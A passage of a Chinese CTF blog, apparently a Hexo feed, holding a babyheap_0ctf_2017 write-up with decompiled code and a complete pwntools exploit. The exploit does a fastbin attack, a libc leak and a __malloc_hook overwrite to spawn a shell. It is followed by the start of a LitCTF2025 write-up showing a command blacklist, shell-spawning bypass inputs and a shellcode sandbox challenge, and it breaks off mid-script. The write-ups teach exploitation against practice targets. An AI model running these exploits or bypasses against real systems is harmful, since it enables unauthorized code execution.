class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_D48</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(_DWORD *)(<span class="number">24LL</span> * i + a1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      v2 = sub_138C();</span><br><span class="line">      <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v2 &gt; <span class="number">4096</span> )</span><br><span class="line">          v2 = <span class="number">4096</span>;</span><br><span class="line">        v3 = <span class="built_in">calloc</span>(v2, <span class="number">1uLL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v3 )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        *(_DWORD *)(<span class="number">24LL</span> * i + a1) = <span class="number">1</span>;</span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">24LL</span> * i + <span class="number">8</span>) = v2;</span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">24LL</span> * i + <span class="number">16</span>) = v3;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Allocate Index %d\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)i);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此题中这些堆操作函数中的sub_138c函数功能是将输入的字符串转为数字，这里就不放这个函数的源码了<br>循环16次，存在16个可用空间。每次申请i从0到15循环，找到未被使用且满足要求的chunk，并返回对应的i作为index编号<br>Edit函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_E7F</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = sub_138C();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)result &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="type">unsigned</span> <span class="type">int</span> *)(<span class="number">24LL</span> * (<span class="type">int</span>)result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      result = sub_138C();</span><br><span class="line">      v3 = result;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">int</span>)result &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> sub_11B2(*(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>), v3);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次要求输入size，不限制输入大小，可以堆溢出<br>Free函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_F50</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = sub_138C();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)result &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="type">unsigned</span> <span class="type">int</span> *)(<span class="number">24LL</span> * (<span class="type">int</span>)result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(<span class="number">24LL</span> * v2 + a1) = <span class="number">0</span>;</span><br><span class="line">      *(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">8</span>) = <span class="number">0LL</span>;</span><br><span class="line">      <span class="built_in">free</span>(*(<span class="type">void</span> **)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>));</span><br><span class="line">      result = <span class="number">24LL</span> * v2 + a1;</span><br><span class="line">      *(_QWORD *)(result + <span class="number">16</span>) = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>释放后指针置0，不能uaf，但可以双重释放进行fastbin attack<br>fee后对应的记录该chunk是否被使用的值会被重新设置为0<br>Dump函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_1051</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = sub_138C();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)result &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_DWORD *)(<span class="number">24LL</span> * result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      sub_130F(*(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>), *(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">8</span>));</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(byte_14F1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印堆块内容，可以用于泄露fd指针<br>先放exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/turing/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28809</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Command: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Command: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Content: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Command: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Command: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#4</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#1 back</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#2 (point to 4)</span></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#防止4被top chunk合并</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">leak_hook=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">88</span>-<span class="number">0x10</span></span><br><span class="line">libcbase=leak_hook-<span class="number">0x3c4b78</span>+<span class="number">88</span>+<span class="number">0x10</span>  <span class="comment">#-libc.sym[&#x27;__malloc_hook&#x27;]</span></span><br><span class="line">one_gadget_offset=<span class="number">0x4526a</span></span><br><span class="line">getshell=libcbase+one_gadget_offset</span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload=p64(leak_hook-<span class="number">35</span>)</span><br><span class="line">fill(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#5</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#6 (leak_hook-35)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">35</span>-<span class="number">0x10</span>)+p64(getshell)</span><br><span class="line">fill(<span class="number">6</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>因为用笔者本地的libc-2.23.so调试出来的部分偏移与远程有一点偏差，所以有些地方的偏移直接用了其他师傅的<br>checksec看一眼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">turing@LAPTOP-6JKPOVPE:~$ checksec babyheap_0ctf_2017</span><br><span class="line">[*] &#x27;/home/turing/babyheap_0ctf_2017&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br></pre></td></tr></table></figure><p>很好，64位保护全开<br>我们照着exp一步步走，先申请0123四个大小0x10（实际为0x20）的堆块，然后再申请大小0x80（实际为0x90）的堆块。<br><strong>关于chunk大小：前0x8字节为pre_size，接下0x8字节为size域，存储chunk大小。而其实size域的低3bit是标志位，size域存储的原始数值并不是chunk的真正大小，而应该把size域低3bit清零才是</strong>。所以堆块0123的size域其实是0x21，低3bit清零后为0x20，chunk实际大小为0x20。其他chunk也同理。<br>回到题目，先把1和2代表的chunk给free，送入了fastbin（此题glibc版本还未引入tcachebin），接下里chunk0便是修改chunk2的源头，利用选项2，Edit函数的堆溢出漏洞，将chunk2的fd指针修改，只修改了最低一字节为0x80，因为这几个chunk的地址前几个字节部分都是一致的（调试一下就知道了），这样修改后fastbin中的chunk2的fd便指向了chunk4，然后再利用chunk3的溢出来修改chunk4的size域为0x21，以伪造出chunk4在fastbin中的假象。接下来重新将chunk1和chunk2申请回来，注意此时在fastbin链表中chunk2为第一个chunk，而chunk4被伪装成了下一个chunk，所以申请时index&#x3D;1得到的chunk为原来的chunk2，而index&#x3D;2申请到的堆块其实时chunk4<br>此时我们发现index&#x3D;2和index&#x3D;4都指向了同一个chunk4。这样chunk4在被释放后仍然可以通过index&#x3D;2访问到。接下来我们要把chunk4放入unsortedbin（<strong>程序free时，如果chunk不满足fastbin要求，则会放入unsorted Bin ,其在使用的过程中，插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾开始遍历获取。在程序 malloc 时，如果在 tcachebin，fastbin中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中</strong>），于是乎我们再次利用chunk3溢出来修改chunk4的size域变回0x91，然后free掉chunk4<br><strong>这里要注意，程序free一个chunk时会检查其下一个chunk，如果这个释放的chunk与top chunk相邻，则会被top chunk合并</strong>。<br>所以我们释放chunk4前先随便申请一个不会影响我们的chunk5，防止chunk4被free时合并进top chunk<br>这样chunk4进入了unsorted bin，<code>unsorted bin</code>是一个循环双链表</p><p><img src="/images/unsortedbins-struct.jpg"></p><p>正因为其是一个双向循环链表，可以看到<code>unsorted bin</code>中最早被释放chunk的<code>fd</code>指针会指向main_arena的某一块（与<code>main_arena</code>起始地址存在偏移），如果我们可以把正确的<code>fd</code>指针 leak 出来，就可以获得一个与 <code>main_arena </code>有固定偏移的地址，这个偏移可以通过调试得出。而<code>main_arena </code>是一个 <code>struct malloc_state </code>类型的全局变量，是 <code>ptmalloc </code>管理主分配区的唯一实例。说到全局变量，立马可以想到他会被分配在<code>.data</code>或者<code>.bss</code>等段上，我们就可以获得 <code>main_arena</code>与 libc 基地址的偏移，泄露libc<br>主要有两个泄露<code>main_arena</code>地址的方法。一是<code>malloc_trim</code>这个函数直接访问了<code>main_arena</code>地址，我们用ida分析一下对应的.so文件直接就能得到<code>main_arena</code>地址<br>二是利用<code>__malloc_hook</code>函数，这个函数和<code>main_arena </code>的地址差是 0x10，而大多数的 libc 都可以直接查出<code>__malloc_hook</code>的地址，这样可以大幅减小工作量。以 pwntools 为例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main_arena_offset = ELF(<span class="string">&quot;libc.so.6&quot;</span>).symbols[<span class="string">&quot;__malloc_hook&quot;</span>] + <span class="number">0x10</span></span><br></pre></td></tr></table></figure><p>这个0x10的偏移不会变。回到题目，我们利用index&#x3D;2访问在unsorted bin中的chunk4，打印出其数据，成功泄露其fd指针，再调试程序得到泄露地址与main_arena的偏移88，于是malloc_hook的地址我们便得到了。此时libcbase便可以计算出了。<br><strong>malloc_hook函数是一个危险的函数，在程序调用malloc，realloc函数时都会先执行malloc_hook函数</strong>，于是我们再利用fastbin attack，修改malloc_hook函数地址为我们利用one_gadget工具找到的可以直接getshell的地址，便大功告成了<br>因为我们此时index&#x3D;2也指向chunk4，实际上实现了uaf漏洞，于是我们要把chunk4放入fastbin，但chunk4太大了，且此时仍在unsortedbin中，于是我们再申请一个0x60的chunk，实际上这时候fastbin中没有chunk，返回的便是unsorted bin中别分割的chunk4，且index&#x3D;4，chunk4剩余的0x20仍在unsorted bin中<br>然后我们再free掉chunk4，chunk4便如愿以偿的进入了fastbin，接下来利用uaf进行fastbin attack,最后再申请一个chunk以执行malloc_hook便成功getshell</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> fastbin attack </category>
          
          <category> unsortedbin attack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
            <tag> 复现 </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LitCTF2025</title>
      <link href="/2025/06/30/LitCTF2025/"/>
      <url>/2025/06/30/LitCTF2025/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>2025-6-30：犯懒了，仅仅复现了<code>nc</code>这道题目<br>2025-9-21补：wmctf强度太大，回过头来复现一下这个，放松一下身心</p><h2 id="0x01-nc"><a href="#0x01-nc" class="headerlink" title="0x01 nc"></a>0x01 nc</h2><p>把附件拖进ida发现得出了我看不懂的一坨玩意<br>在re手的指导下，直接用vscode打开得到了一段python代码，如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;input your command&quot;</span>)</span><br><span class="line"></span><br><span class="line">blacklist = [<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;cd&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;$&#123;IFS&#125;&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> command:</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    os.system(command)</span><br></pre></td></tr></table></figure><p>直接给到了system执行，但是过滤了一系列命令<br>我第一思路是变量替换,输入如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=s;b=h;$a<span class="variable">$b</span></span><br></pre></td></tr></table></figure><p>直接输入<code>$0</code>也可<code>getshell</code></p><h2 id="0x02-shellcode"><a href="#0x02-shellcode" class="headerlink" title="0x02 shellcode"></a>0x02 shellcode</h2><p>源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  buf = mmap(<span class="number">0LL</span>, <span class="number">0x1000u</span>LL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf == (<span class="type">void</span> *)<span class="number">-1LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;mmap failed&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome LitCTF 2025&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your shellcode: &quot;</span>);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  init_sandbox();</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100u</span>LL);</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))buf)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看沙箱</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008</span><br><span class="line"> 0005: 0x15 0x01 0x00 0x00000000  if (A == read) goto 0007</span><br><span class="line"> 0006: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>有<code>open</code>，<code>read</code>缺<code>write</code>，直接侧信道爆破<br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span 